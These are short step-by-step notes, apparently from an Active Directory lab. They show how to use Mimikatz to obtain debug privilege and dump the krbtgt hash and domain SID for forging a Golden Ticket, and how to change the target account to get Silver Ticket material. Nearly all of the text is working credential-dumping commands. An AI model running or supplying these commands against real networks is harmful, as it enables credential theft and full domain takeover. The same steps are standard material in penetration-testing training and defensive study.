﻿1.) cd downloads && mimikatz.exe - navigate to the directory mimikatz is in and run mimikatz

2.) privilege::debug - ensure this outputs \[privilege '20' ok\]

﻿3.) lsadump::lsa /inject /name:krbtgt

- This will dump the hash as well as the security identifier needed to create a Golden Ticket. To create a silver ticket you need to change the /name: to dump the hash of either a domain admin account or a service account such as the SQLService account.
